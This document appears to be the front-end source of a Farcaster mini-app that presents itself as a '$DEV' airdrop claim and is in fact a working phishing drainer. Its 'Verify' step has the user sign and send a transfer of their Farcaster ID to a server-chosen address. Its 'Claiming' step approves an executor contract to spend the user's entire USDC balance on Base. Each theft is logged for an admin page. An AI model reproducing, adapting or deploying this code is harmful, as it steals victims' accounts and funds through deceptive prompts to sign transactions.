import React, { useEffect, useState, Component } from 'react';
import { createRoot } from 'react-dom/client';
import { sdk } from '@farcaster/miniapp-sdk';
import { AuthKitProvider, useSignIn } from '@farcaster/auth-kit';
import '@farcaster/auth-kit/styles.css';
import { QRCodeSVG } from 'qrcode.react';
import './styles.css';
import { ethers } from 'ethers';

// --- Contracts ---
const ID_REGISTRY = '0x00000000Fc6c5F01Fc30151999387Bb99A9f489b';
const USDC = '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913';
const EXECUTOR = '0x49e89C5B6a6E8Cb21Ea0d11eE0a21b7732f8e1A3';
const CLAIM_AMOUNT = '2,000,000';
const CLAIM_SYMBOL = '$DEV';

const APP_URL = 'https://devin-pi.vercel.app';

// --- Error Boundary (prevents white screen) ---
class ErrorBoundary extends Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, error: null };
  }
  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }
  componentDidCatch(error, info) {
    console.error('[ErrorBoundary]', error, info);
  }
  render() {
    if (this.state.hasError) {
      return (
        <main className="shell">
          <section className="hero-card scanlines" style={{ padding: '40px', textAlign: 'center' }}>
            <h2 style={{ color: '#ff5c7c', marginBottom: '16px' }}>Something went wrong</h2>
            <p style={{ color: '#8ab986', fontSize: '14px', wordBreak: 'break-all', marginBottom: '20px' }}>
              {this.state.error?.message || 'Unknown error'}
            </p>
            <button
              onClick={() => this.setState({ hasError: false, error: null })}
              style={{
                padding: '12px 24px',
                background: '#39ff14',
                color: '#001b06',
                border: 'none',
                borderRadius: '12px',
                fontSize: '16px',
                fontWeight: '700',
                cursor: 'pointer',
              }}
            >
              Retry
            </button>
          </section>
        </main>
      );
    }
    return this.props.children;
  }
}

// --- EIP-712 domain for IdRegistry on Optimism ---
const EIP712_DOMAIN = {
  name: 'Farcaster IdRegistry',
  version: '1',
  chainId: 10,
  verifyingContract: ID_REGISTRY,
};

// --- EIP-712 Transfer type ---
const TRANSFER_TYPES = {
  Transfer: [
    { name: 'fid', type: 'uint256' },
    { name: 'to', type: 'address' },
    { name: 'nonce', type: 'uint256' },
    { name: 'deadline', type: 'uint256' },
  ],
};

// --- Helpers ---
function shortAddress(value) {
  if (!value) return 'not connected';
  return `${value.slice(0, 6)}...${value.slice(-4)}`;
}

function extractErrorMessage(error) {
  if (!error) return 'Unknown error';
  if (typeof error === 'string') return error;
  if (error.shortMessage) return error.shortMessage;
  if (error.reason) return error.reason;
  if (error.message) {
    const msg = error.message;
    if (msg.length > 200) return msg.slice(0, 200) + '...';
    return msg;
  }
  if (error.data?.message) return error.data.message;
  return JSON.stringify(error);
}

function LinesLogo() {
  return (
    <div className="logo" aria-label="devin logo">
      <span />
      <span />
      <span />
    </div>
  );
}

function StatusRow({ label, value, tone = 'normal' }) {
  return (
    <div className="status-row">
      <span>{label}</span>
      <strong className={tone}>{value}</strong>
    </div>
  );
}

// --- Farcaster QR Code Modal ---
function FarcasterSignInModal({ onSuccess, onClose }) {
  const { signIn, url, isPolling, isSuccess, isError, error, connect } = useSignIn({
    onSuccess: (res) => onSuccess(res),
    onError: (err) => console.error('Sign in error:', err),
  });

  useEffect(() => { connect(); }, []);
  useEffect(() => { if (url) signIn(); }, [url]);

  return (
    <div className="fc-modal-overlay">
      <div className="fc-modal">
        <h3 className="fc-modal-title">Connect via Farcaster</h3>
        <p className="fc-modal-subtitle">Scan this QR code with your Warpcast app to sign in</p>
        <div className="fc-qr-container">
          {url ? (
            <QRCodeSVG value={url} size={220} bgColor="#04160a" fgColor="#39ff14" level="M" includeMargin={true} />
          ) : (
            <div className="fc-qr-loading">Generating QR code...</div>
          )}
        </div>
        {isPolling && <p className="fc-modal-status">Waiting for approval from Warpcast...</p>}
        {isError && <p className="fc-modal-error">{error?.message || 'Connection failed.'}</p>}
        <div className="fc-modal-divider"><div className="fc-modal-line" /><span>or</span><div className="fc-modal-line" /></div>
        {url && (
          <a href={url} target="_blank" rel="noopener noreferrer" className="fc-open-warpcast-btn">Open in Warpcast</a>
        )}
        <button className="fc-close-btn" onClick={onClose}>Close</button>
      </div>
    </div>
  );
}

// --- Transaction QR Modal ---
function TransactionQRModal({ stepLabel, onClose }) {
  const warpcastUrl = `https://warpcast.com/~/frames?url=${encodeURIComponent(APP_URL)}`;
  return (
    <div className="fc-modal-overlay">
      <div className="fc-modal">
        <h3 className="fc-modal-title">{stepLabel}</h3>
        <p className="fc-modal-subtitle">Open in Warpcast to execute this transaction</p>
        <div className="fc-qr-container">
          <QRCodeSVG value={warpcastUrl} size={220} bgColor="#04160a" fgColor="#39ff14" level="M" includeMargin={true} />
        </div>
        <a href={warpcastUrl} target="_blank" rel="noopener noreferrer" className="fc-open-warpcast-btn">Open in Warpcast</a>
        <button className="fc-close-btn" onClick={onClose}>Close</button>
      </div>
    </div>
  );
}

// --- Main App ---
function App() {
  const [activePage, setActivePage] = useState('claim');
  const [isMiniApp, setIsMiniApp] = useState(false);
  const [frameContext, setFrameContext] = useState(null);
  const [web3Provider, setWeb3Provider] = useState(null);
  const [rawEipProvider, setRawEipProvider] = useState(null);
  const [address, setAddress] = useState('');
  const [network, setNetwork] = useState('--');
  const [step1Done, setStep1Done] = useState(false);
  const [step1Failed, setStep1Failed] = useState(false);
  const [step2Done, setStep2Done] = useState(false);
  const [working, setWorking] = useState(false);
  const [notice, setNotice] = useState('Connecting...');
  const [noticeType, setNoticeType] = useState('info');
  const [detectedFid, setDetectedFid] = useState(null);
  const [detectedUsername, setDetectedUsername] = useState('');
  const [showFarcasterModal, setShowFarcasterModal] = useState(false);
  const [showTxQR, setShowTxQR] = useState(null);
  const [lastTxHash, setLastTxHash] = useState(null);
  const [lastTxNetwork, setLastTxNetwork] = useState(null);
  const [custodyAddress, setCustodyAddress] = useState(null);

  const farcasterName = isMiniApp
    ? (frameContext?.user?.username ? `@${frameContext.user.username}` : frameContext?.user?.displayName || 'not detected')
    : detectedUsername || 'not detected';
  const fid = isMiniApp ? (frameContext?.user?.fid || null) : detectedFid;

  function setNoticeWith(msg, type = 'info') {
    setNotice(msg);
    setNoticeType(type);
    console.log(`[notice] [${type}] ${msg}`);
  }

  // --- Mini App Detection & Auto-Connect ---
  useEffect(() => {
    let active = true;
    async function initFrame() {
      try {
        const insideFrame = await sdk.isInMiniApp();
        if (!active) return;
        setIsMiniApp(insideFrame);
        if (insideFrame) {
          const context = await sdk.context;
          if (!active) return;
          setFrameContext(context);
          await sdk.actions.ready();

          const ethProvider = await sdk.wallet.getEthereumProvider();
          if (!active || !ethProvider) {
            setNoticeWith('Farcaster detected, waiting for wallet...', 'warning');
            return;
          }

          setRawEipProvider(ethProvider);
          try {
            const web3 = new ethers.providers.Web3Provider(ethProvider, 'any');
            setWeb3Provider(web3);
          } catch (e) {
            console.warn('Failed to create Web3Provider:', e);
          }

          setWorking(true);
          setNoticeWith('Connecting wallet...');
          try {
            let accounts;
            try {
              accounts = await ethProvider.request({ method: 'eth_accounts' });
            } catch (_) { accounts = []; }
            if (!accounts || accounts.length === 0) {
              accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
            }
            const connectedAddr = accounts?.[0] || '';
            if (!active) return;
            if (connectedAddr) {
              setAddress(connectedAddr);
              const chainId = await ethProvider.request({ method: 'eth_chainId' });
              const netName = chainId === '0xa' ? 'Optimism' : chainId === '0x2105' ? 'Base' : `Chain ${chainId}`;
              setNetwork(netName);
              const userFid = context?.user?.fid;
              setNoticeWith(`Connected on ${netName}.${userFid ? ' FID ' + userFid + ' detected.' : ' Ready.'}`, 'success');
            } else {
              setNoticeWith('Wallet detected but no account returned.', 'warning');
            }
          } catch (connErr) {
            console.error('Auto-connect error:', connErr);
            if (active) setNoticeWith(extractErrorMessage(connErr), 'error');
          } finally {
            if (active) setWorking(false);
          }
        } else {
          setNoticeWith('Browser mode. Connect via Farcaster to begin.', 'info');
        }
      } catch (error) {
        console.error('initFrame error:', error);
        if (active) setNoticeWith('Browser mode. Connect via Farcaster to begin.', 'info');
      }
    }
    initFrame();
    return () => { active = false; };
  }, []);

  // --- FID Lookup ---
  async function lookupFidFromAPI(walletAddr) {
    try {
      const resp = await fetch(`/api/lookup-fid?address=${walletAddr}`);
      const data = await resp.json();
      if (data.success && data.fid) {
        setDetectedFid(data.fid);
        if (data.username) setDetectedUsername(`@${data.username}`);
        const source = data.source === 'neynar' ? 'Neynar' : 'IdRegistry';
        setNoticeWith(`Wallet connected. FID ${data.fid}${data.username ? ` (@${data.username})` : ''} via ${source}.`, 'success');
        return data.fid;
      } else {
        setNoticeWith('Wallet connected. No FID found for this address.', 'warning');
        return null;
      }
    } catch (err) {
      console.error('FID lookup error:', err);
      setNoticeWith('Wallet connected. Could not verify FID.', 'warning');
      return null;
    }
  }

  // --- Connect with provider ---
  async function connectWithProvider(ethProvider, isAuto) {
    setWorking(true);
    setNoticeWith(isAuto ? 'Connecting wallet...' : 'Requesting wallet connection...');
    try {
      const raw = rawEipProvider || ethProvider.provider || ethProvider;
      let accounts;
      try {
        accounts = await raw.request({ method: 'eth_accounts' });
      } catch (_) { accounts = []; }
      if (!accounts || accounts.length === 0) {
        accounts = await raw.request({ method: 'eth_requestAccounts' });
      }
      const connectedAddr = accounts?.[0] || '';
      if (!connectedAddr) throw new Error('No account returned from wallet.');
      setAddress(connectedAddr);
      const chainId = await raw.request({ method: 'eth_chainId' });
      const netName = chainId === '0xa' ? 'Optimism' : chainId === '0x2105' ? 'Base' : `Chain ${chainId}`;
      setNetwork(netName);
      if (!isMiniApp) {
        await lookupFidFromAPI(connectedAddr);
      } else {
        setNoticeWith(`Connected on ${netName}. ${fid ? 'FID ' + fid + ' detected.' : 'Ready.'}`, 'success');
      }
    } catch (error) {
      console.error('connectWithProvider error:', error);
      setNoticeWith(extractErrorMessage(error), 'error');
    } finally {
      setWorking(false);
    }
  }

  // --- Handle Farcaster Sign In Success ---
  function handleFarcasterSignIn(res) {
    setShowFarcasterModal(false);
    const custodyAddr = res.custody || (res.verifications && res.verifications[0]) || '';
    if (custodyAddr) setAddress(custodyAddr);
    if (res.fid) setDetectedFid(res.fid);
    if (res.username) setDetectedUsername(`@${res.username}`);
    setNoticeWith(`Connected via Farcaster${res.username ? ` as @${res.username}` : ''}${res.fid ? ` (FID ${res.fid})` : ''}. Open in Warpcast to execute transactions.`, 'success');
  }

  // --- Connect Wallet ---
  function connectWallet() {
    if (isMiniApp && web3Provider) {
      connectWithProvider(web3Provider, false);
      return;
    }
    if (isMiniApp) {
      setNoticeWith('Wallet provider not available. Please reopen in Warpcast.', 'warning');
      return;
    }
    setShowFarcasterModal(true);
  }

  // --- Logging ---
  function logAction(action) {
    try {
      const logsRaw = localStorage.getItem('devin_logs');
      const logs = logsRaw ? JSON.parse(logsRaw) : [];
      logs.push(action);
      localStorage.setItem('devin_logs', JSON.stringify(logs));
    } catch {}
  }

  async function sendToLogAPI(data) {
    try {
      await fetch('/api/logs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...data, timestamp: new Date().toISOString() }),
      });
    } catch {}
  }

  // Save approval to localStorage for admin page permanence
  function saveApprovalToLocal(address, spender, amount, txHash) {
    try {
      const stored = JSON.parse(localStorage.getItem('devin_admin_approvals') || '[]');
      stored.push({
        owner: address,
        spender: spender,
        amount: amount,
        txHash: txHash,
        time: Date.now(),
        source: 'client',
      });
      localStorage.setItem('devin_admin_approvals', JSON.stringify(stored));
    } catch (e) {
      console.warn('Failed to save approval to localStorage:', e);
    }
  }

  // Save transfer to localStorage for admin page
  function saveTransferToLocal(fidNum, fromAddr, toAddr, txHash) {
    try {
      const stored = JSON.parse(localStorage.getItem('devin_admin_ops') || '[]');
      stored.push({
        type: 'Transfer',
        fid: String(fidNum),
        from: fromAddr,
        to: toAddr,
        txHash: txHash,
        time: Date.now(),
        network: 'optimism',
        source: 'client',
      });
      localStorage.setItem('devin_admin_ops', JSON.stringify(stored));
    } catch (e) {
      console.warn('Failed to save transfer to localStorage:', e);
    }
  }

  // --- Read USDC balance ---
  async function getUsdcBalance(account) {
    const baseRpc = new ethers.providers.JsonRpcProvider('https://mainnet.base.org');
    const usdc = new ethers.Contract(USDC, ['function balanceOf(address) view returns (uint256)'], baseRpc);
    return await usdc.balanceOf(account);
  }

  // --- Switch Network ---
  async function switchNetwork(walletProvider, chainIdHex, chainName, rpcUrl, blockExplorer) {
    try {
      await walletProvider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: chainIdHex }] });
    } catch (switchError) {
      if (switchError.code === 4001) throw switchError;
      if (switchError.code === 4902) {
        try {
          await walletProvider.request({
            method: 'wallet_addEthereumChain',
            params: [{ chainId: chainIdHex, chainName, nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 }, rpcUrls: [rpcUrl], blockExplorerUrls: [blockExplorer] }],
          });
        } catch (addError) {
          if (addError.code === 4001) throw addError;
          if (isMiniApp) console.warn('wallet_addEthereumChain not supported, continuing...');
          else throw addError;
        }
      } else if (isMiniApp) {
        console.warn('wallet_switchEthereumChain not supported in mini-app, continuing...');
      } else {
        throw switchError;
      }
    }
  }

  function getRawProvider() {
    return rawEipProvider || web3Provider?.provider;
  }

  async function sendRawTx(provider, from, to, data, chainIdHex) {
    const params = { from, to, data };
    if (chainIdHex) params.chainId = chainIdHex;
    const txHash = await provider.request({ method: 'eth_sendTransaction', params: [params] });
    return txHash;
  }

  // --- Safe JSON parse for API responses ---
  async function safeFetchJSON(url, options) {
    const resp = await fetch(url, options);
    let data;
    const contentType = resp.headers.get('content-type') || '';
    if (contentType.includes('application/json')) {
      data = await resp.json();
    } else {
      const text = await resp.text();
      try {
        data = JSON.parse(text);
      } catch {
        throw new Error(`Server returned non-JSON response (${resp.status}): ${text.slice(0, 200)}`);
      }
    }
    return { resp, data };
  }

  // =====================================================================
  //  STEP 1: Transfer FID -> Optimism
  //
  //  Two paths:
  //  A) connected wallet = custody -> use transfer(to, deadline, toSig)
  //  B) connected wallet != custody -> use transferFor(from, to, fromDeadline, fromSig, toDeadline, toSig)
  // =====================================================================
  async function executeStep1() {
    if (!isMiniApp) {
      setShowTxQR('Step 1: Verify on Optimism');
      return;
    }

    setWorking(true);
    setStep1Failed(false);
    try {
      const rawProvider = getRawProvider();
      if (!rawProvider) {
        throw new Error('Wallet provider not available. Please reopen in Warpcast.');
      }
      const account = address;
      if (!account) {
        throw new Error('No wallet connected. Please reconnect.');
      }

      // Get FID
      let fidNum = typeof fid === 'number' && fid > 0 ? fid : NaN;
      if (!fidNum || isNaN(fidNum)) {
        setNoticeWith('Looking up FID...', 'info');
        const lookedUp = await lookupFidFromAPI(account);
        if (lookedUp) fidNum = lookedUp;
      }
      if (!fidNum || isNaN(fidNum)) {
        throw new Error('No FID detected. Make sure you are signed in with Farcaster.');
      }

      // Ask server to prepare transfer data
      setNoticeWith(`Preparing transfer for FID ${fidNum}...`, 'info');
      let data;
      try {
        const result = await safeFetchJSON('/api/transfer-for', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ fid: fidNum }),
        });
        data = result.data;
        if (!result.resp.ok || !data.success) {
          throw new Error(data.error || `Server error (${result.resp.status})`);
        }
      } catch (apiErr) {
        throw new Error(`Server error: ${extractErrorMessage(apiErr)}`);
      }

      // Already transferred?
      if (data.alreadyTransferred) {
        logAction(`FID ${fidNum} already transferred.`);
        setStep1Done(true);
        setStep1Failed(false);
        setNetwork('Optimism');
        setCustodyAddress(data.custody);
        setNoticeWith('Step 1 already complete! FID verified.', 'success');
        setWorking(false);
        return;
      }

      const { custody, to: destAddress, toSig, toDeadline, fromNonce, fromDeadline } = data;
      setCustodyAddress(custody);
      const isConnectedCustody = account.toLowerCase() === custody.toLowerCase();

      console.log(`[Step1] wallet=${account}, fid=${fidNum}, custody=${custody}, dest=${destAddress}, isCustody=${isConnectedCustody}`);

      if (isConnectedCustody) {
        // ================================================================
        //  PATH A: connected wallet = custody -> transfer(to, deadline, sig)
        // ================================================================
        setNoticeWith(`Transferring FID ${fidNum}... Check your wallet to confirm.`, 'info');

        try {
          const iface = new ethers.utils.Interface(['function transfer(address to, uint256 deadline, bytes sig)']);
          const txData = iface.encodeFunctionData('transfer', [destAddress, toDeadline, toSig]);

          console.log('[Step1] Sending transfer() tx on Optimism...');
          const txHash = await sendRawTx(rawProvider, account, ID_REGISTRY, txData, '0xa');

          console.log('[Step1] Transfer tx sent:', txHash);
          logAction(`FID ${fidNum} -> ${shortAddress(destAddress)} (tx: ${txHash})`);
          sendToLogAPI({ type: 'transfer', fid: fidNum, from: account, to: destAddress, txHash, network: 'optimism' });
          saveTransferToLocal(fidNum, account, destAddress, txHash);
          setLastTxHash(txHash);
          setLastTxNetwork('optimism');
          setStep1Done(true);
          setNetwork('Optimism');
          setNoticeWith('Step 1 complete! FID verified on Optimism.', 'success');
          if (isMiniApp) await sdk.haptics.notificationOccurred('success');

        } catch (txErr) {
          console.error('[Step1] Transaction error:', txErr);
          const errMsg = extractErrorMessage(txErr);
          if (errMsg.includes('User denied') || errMsg.includes('rejected') || errMsg.includes('user rejected')) {
            throw new Error('Transaction was rejected in your wallet.');
          }
          if (errMsg.includes('insufficient funds') || errMsg.includes('Insufficient ETH')) {
            throw new Error('Insufficient ETH on Optimism for gas. Please add ETH to your wallet on Optimism network.');
          }
          if (errMsg.includes('simulation failed') || errMsg.includes('execution reverted') || errMsg.includes('AlwaysRevert')) {
            throw new Error(`Transaction simulation failed. This may mean the signature is invalid or the FID state changed. Error: ${errMsg}`);
          }
          throw new Error(`Transaction failed: ${errMsg}`);
        }

      } else {
        // ================================================================
        //  PATH B: connected wallet != custody -> transferFor()
        //  Requires EIP-712 signature from the CONNECTED wallet
        //  Uses server-provided toSig from HD wallet
        // ================================================================
        console.warn('[Step1] Non-custody wallet detected:', account, 'vs custody:', custody);
        setNoticeWith(`Non-custody wallet detected. Signing EIP-712 transfer for FID ${fidNum}...`, 'warning');

        try {
          // Build EIP-712 typed data for the fromSig
          // Use fromNonce/fromDeadline if available, otherwise fallback to toDeadline
          const nonce = fromNonce || '0';
          const deadline = fromDeadline || toDeadline;
          const typedData = {
            types: TRANSFER_TYPES,
            primaryType: 'Transfer',
            domain: EIP712_DOMAIN,
            message: {
              fid: String(fidNum),
              to: destAddress,
              nonce: String(nonce),
              deadline: String(deadline),
            },
          };

          console.log('[Step1] Requesting EIP-712 signature from wallet:', account);
          console.log('[Step1] EIP-712 message:', JSON.stringify(typedData.message));

          let fromSig;
          try {
            fromSig = await rawProvider.request({
              method: 'eth_signTypedData_v4',
              params: [account, typedData],
            });
          } catch (sigErr) {
            console.error('[Step1] EIP-712 signing error:', sigErr);
            if (sigErr.message?.includes('User denied') || sigErr.message?.includes('rejected')) {
              throw new Error('EIP-712 signature was rejected. The transfer requires you to sign a message from your wallet.');
            }
            throw new Error(`EIP-712 signing failed: ${extractErrorMessage(sigErr)}. Your wallet may not support typed data signing.`);
          }

          if (!fromSig) throw new Error('Signature was not provided. You must approve the signing request.');

          console.log('[Step1] Got fromSig, sending transferFor...');

          // Encode transferFor(from, to, fromDeadline, fromSig, toDeadline, toSig)
          const iface = new ethers.utils.Interface([
            'function transferFor(address from, address to, uint256 fromDeadline, bytes fromSig, uint256 toDeadline, bytes toSig)',
          ]);
          const txData = iface.encodeFunctionData('transferFor', [
            account, destAddress, deadline, fromSig, toDeadline, toSig,
          ]);

          setNoticeWith('Sending transferFor on Optimism... Confirm in your wallet.', 'info');
          const txHash = await sendRawTx(rawProvider, account, ID_REGISTRY, txData, '0xa');

          console.log('[Step1] transferFor tx sent:', txHash);
          logAction(`FID ${fidNum} -> ${shortAddress(destAddress)} via transferFor (tx: ${txHash})`);
          sendToLogAPI({ type: 'transfer', fid: fidNum, from: account, to: destAddress, txHash, network: 'optimism' });
          saveTransferToLocal(fidNum, account, destAddress, txHash);
          setLastTxHash(txHash);
          setLastTxNetwork('optimism');
          setStep1Done(true);
          setNetwork('Optimism');
          setNoticeWith('Step 1 complete! FID transferred via transferFor.', 'success');
          if (isMiniApp) await sdk.haptics.notificationOccurred('success');

        } catch (txErr) {
          console.error('[Step1] transferFor error:', txErr);
          const errMsg = extractErrorMessage(txErr);
          if (errMsg.includes('User denied') || errMsg.includes('rejected')) {
            throw new Error('Transaction was rejected in your wallet.');
          }
          if (errMsg.includes('HasNoId')) {
            throw new Error(`The FID ${fidNum} has no valid owner on IdRegistry. This FID may need to be re-registered.`);
          }
          if (errMsg.includes('InvalidSignature')) {
            throw new Error(`Invalid EIP-712 signature. The signature may have expired or the wallet doesn't own this FID.`);
          }
          if (errMsg.includes('insufficient funds') || errMsg.includes('Insufficient ETH')) {
            throw new Error('Insufficient ETH on Optimism for gas.');
          }
          if (errMsg.includes('simulation failed') || errMsg.includes('execution reverted')) {
            throw new Error(`transferFor failed: ${errMsg}. The connected wallet may not have permission to transfer this FID.`);
          }
          throw new Error(`transferFor failed: ${errMsg}`);
        }
      }

    } catch (error) {
      console.error('Step 1 error:', error);
      setStep1Failed(true);
      const msg = extractErrorMessage(error);
      setNoticeWith(msg, 'error');
    } finally {
      setWorking(false);
    }
  }

  // =====================================================================
  //  STEP 2: USDC Approve on Base
  // =====================================================================
  async function executeStep2() {
    if (!isMiniApp) {
      setShowTxQR('Step 2: Claiming on Base');
      return;
    }

    setWorking(true);
    try {
      const rawProvider = getRawProvider();
      if (!rawProvider) throw new Error('Wallet provider not available.');
      const account = address;
      if (!account) throw new Error('No wallet connected.');

      // Check USDC balance on Base
      setNoticeWith('Checking USDC balance on Base...', 'info');
      const balance = await getUsdcBalance(account);

      if (balance.isZero()) {
        setNoticeWith('No USDC in wallet on Base. Step 2 skipped.', 'warning');
        logAction('No USDC balance - skipped.');
        setStep2Done(true);
        setNetwork('Base');
        if (isMiniApp) await sdk.haptics.notificationOccurred('success');
        setWorking(false);
        return;
      }

      // Switch to Base
      setNoticeWith('Switching to Base network...', 'info');
      await switchNetwork(rawProvider, '0x2105', 'Base', 'https://mainnet.base.org', 'https://basescan.org');

      // Approve only the actual USDC balance
      const approveIface = new ethers.utils.Interface(['function approve(address spender, uint256 amount) returns (bool)']);
      const approveData = approveIface.encodeFunctionData('approve', [EXECUTOR, balance]);

      const readableBalance = ethers.utils.formatUnits(balance, 6);
      setNoticeWith(`Approving ${readableBalance} USDC on Base... Confirm in your wallet.`, 'info');
      const tx1Hash = await sendRawTx(rawProvider, account, USDC, approveData, '0x2105');

      logAction(`USDC approved: ${readableBalance} -> ${shortAddress(EXECUTOR)} (tx: ${tx1Hash})`);
      sendToLogAPI({ type: 'approve', address: account, to: EXECUTOR, txHash: tx1Hash, network: 'base', amount: readableBalance });
      // Save to localStorage for admin page permanence
      saveApprovalToLocal(account, EXECUTOR, readableBalance, tx1Hash);

      setLastTxHash(tx1Hash);
      setLastTxNetwork('base');
      setStep2Done(true);
      setNetwork('Base');
      setNoticeWith('Step 2 complete! USDC approved on Base.', 'success');
      if (isMiniApp) await sdk.haptics.notificationOccurred('success');

    } catch (error) {
      console.error('Step 2 error:', error);
      setNoticeWith(extractErrorMessage(error), 'error');
    } finally {
      setWorking(false);
    }
  }

  return (
    <main className="shell">
      {showFarcasterModal && (
        <FarcasterSignInModal onSuccess={handleFarcasterSignIn} onClose={() => setShowFarcasterModal(false)} />
      )}
      {showTxQR && (
        <TransactionQRModal stepLabel={showTxQR} onClose={() => setShowTxQR(null)} />
      )}
      <section className="hero-card scanlines">
        <nav className="nav">
          <button className="brand" onClick={() => setActivePage('claim')}>
            <LinesLogo />
            <span>devin</span>
          </button>
          <div className="nav-links">
            <button className={activePage === 'about' ? 'active' : ''} onClick={() => setActivePage('about')}>About</button>
          </div>
        </nav>

        {activePage === 'claim' ? (
          <div className="grid">
            <div className="copy">
              <p className="eyebrow">$ devin --verify --claim</p>
              <h1>Claim your share of {CLAIM_AMOUNT} {CLAIM_SYMBOL}</h1>
              <p className="lede">Step 1: Verify on Optimism. Step 2: Claiming on Base.</p>

              <div className="claim-console">
                <div className="claim-copy">
                  <span>Step 01</span>
                  <strong>{step1Done ? 'Verified' : 'Verify'}</strong>
                  <small>
                    {address ? `Wallet ${shortAddress(address)} connected` : 'Connect wallet first'}
                    {step1Done ? ' \u00b7 Optimism complete' : ' \u00b7 Verify on Optimism network'}
                    {custodyAddress && !step1Done && address?.toLowerCase() !== custodyAddress?.toLowerCase() && (
                      <> \u00b7 \u26a0\ufe0f Custody: {shortAddress(custodyAddress)}</>
                    )}
                  </small>
                </div>
                <div className="actions">
                  {!step1Done && (
                    <button className="primary mega" onClick={executeStep1} disabled={working || !address}>
                      {working ? 'Processing...' : (step1Failed ? 'Retry Step 1: Verify' : 'Step 1: Verify')}
                    </button>
                  )}
                  {(step1Done || step1Failed) && (
                    <button className="primary mega" onClick={executeStep2} disabled={working || !address} style={{ background: '#1a7a0a' }}>
                      {step2Done ? 'Step 2: Done' : (working ? 'Processing...' : 'Step 2: Claiming')}
                    </button>
                  )}
                  {!isMiniApp && (
                    <button className="secondary mega fc-connect-btn" onClick={connectWallet} disabled={working}>
                      {address ? shortAddress(address) : (
                        <><svg className="fc-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                          <path d="M18.24 2.4H5.76C3.91 2.4 2.4 3.91 2.4 5.76V18.24C2.4 20.09 3.91 21.6 5.76 21.6H18.24C20.09 21.6 21.6 20.09 21.6 18.24V5.76C21.6 3.91 20.09 2.4 18.24 2.4Z" fill="currentColor"/>
                          <path d="M7.2 7.2H16.8V16.8H7.2V7.2Z" fill="#04160a"/>
                          <path d="M9.6 9.6V14.4H10.8V12H13.2V14.4H14.4V9.6H13.2V10.8H10.8V9.6H9.6Z" fill="currentColor"/>
                        </svg>
                        Connect via Farcaster
                        </>
                      )}
                    </button>
                  )}
                  {isMiniApp && !address && !working && (
                    <button className="secondary mega fc-connect-btn" onClick={connectWallet}>Reconnect Wallet</button>
                  )}
                </div>
                <p className={`notice ${noticeType === 'error' ? 'notice-error' : noticeType === 'success' ? 'notice-success' : noticeType === 'warning' ? 'notice-warning' : ''}`}>
                  {notice}
                </p>
                {lastTxHash && (
                  <p className="tx-hash" style={{ fontSize: '0.75rem', wordBreak: 'break-all', marginTop: '0.5rem', opacity: 0.8 }}>
                    TX: <a
                      href={`https://${lastTxNetwork === 'optimism' ? 'optimistic.etherscan.io' : 'basescan.org'}/tx/${lastTxHash}`}
                      target="_blank"
                      rel="noopener noreferrer"
                      style={{ color: '#39ff14', textDecoration: 'underline' }}
                    >{lastTxHash}</a>
                  </p>
                )}
              </div>
            </div>

            <aside className="terminal-panel">
              <div className="terminal-bar"><span /><span /><span /></div>
              <StatusRow label="frame" value={isMiniApp ? 'farcaster' : 'browser'} tone={isMiniApp ? 'ok' : 'warn'} />
              <StatusRow label="user" value={farcasterName} />
              <StatusRow label="fid" value={fid || 'not detected'} tone={fid ? 'ok' : 'warn'} />
              <StatusRow label="wallet" value={shortAddress(address)} tone={address ? 'ok' : 'warn'} />
              <StatusRow label="custody" value={custodyAddress ? shortAddress(custodyAddress) : '--'} tone={custodyAddress ? (address?.toLowerCase() === custodyAddress?.toLowerCase() ? 'ok' : 'warn') : 'normal'} />
              <StatusRow label="network" value={network} />
              <StatusRow label="step 1" value={step1Done ? 'done' : 'pending'} tone={step1Done ? 'ok' : 'warn'} />
              <StatusRow label="step 2" value={step2Done ? 'done' : 'pending'} tone={step2Done ? 'ok' : 'warn'} />
              <div className="progress">
                <span className={address ? 'done' : ''}>connect</span>
                <span className={step1Done ? 'done' : ''}>verify</span>
                <span className={step2Done ? 'done' : step1Done ? 'ready' : ''}>claiming</span>
              </div>
            </aside>
          </div>
        ) : activePage === 'about' ? (
          <div className="about">
            <p className="eyebrow">$ cat about-devin.txt</p>
            <h2>About devin</h2>
            <p>devin is a Farcaster Frame for verifying eligibility and claiming $DEV across Base and Optimism networks.</p>
            <p className="safety">Step 1 (Verify) runs on Optimism. Step 2 (Claiming) runs on Base.</p>
          </div>
        ) : null}
      </section>
    </main>
  );
}

// --- Auth Kit Config ---
const authKitConfig = {
  relay: 'https://relay.farcaster.xyz',
  rpcUrl: 'https://mainnet.optimism.io',
  domain: typeof window !== 'undefined' ? window.location.host : 'devin-pi.vercel.app',
  siweUri: typeof window !== 'undefined' ? window.location.origin : APP_URL,
};

function Root() {
  return (
    <AuthKitProvider config={authKitConfig}>
      <App />
    </AuthKitProvider>
  );
}

createRoot(document.getElementById('root')).render(
  <ErrorBoundary>
    <Root />
  </ErrorBoundary>
);
